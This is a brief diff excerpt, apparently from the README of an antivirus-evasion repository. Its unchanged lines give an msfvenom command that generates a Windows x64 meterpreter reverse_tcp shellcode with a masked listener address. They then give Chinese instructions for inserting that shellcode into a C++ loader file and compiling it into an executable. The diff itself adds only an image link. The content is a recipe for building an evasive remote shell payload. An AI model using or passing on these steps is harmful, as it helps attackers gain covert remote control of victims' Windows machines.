@@ -20,3 +20,4 @@ msfvenom -p  windows/x64/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx
 2)将shellcode 替换cpp文件中的test变量，执行gcc .\memshellSleepCpu.cpp -o 123.exe -lstdc++生成exe
 
 
+![](https://github.com/echohun/miansha/blob/main/c++/1.png?raw=true)
